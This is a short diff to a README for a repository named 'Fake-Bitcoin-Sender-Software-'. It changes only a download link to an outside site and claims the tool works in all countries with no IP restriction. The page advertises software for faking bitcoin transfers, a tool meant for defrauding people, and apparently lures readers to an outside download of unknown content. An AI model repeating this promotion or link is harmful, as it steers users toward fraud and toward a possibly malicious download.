@@ -1,6 +1,6 @@
 # Fake-Bitcoin-Sender-Software-
 
-# More information and download : https://btcflash.myfr.xyz/
+# More information and download : https://btcflash.myfr.xyz
 
 -Work in all countries, no ip address restriction
 
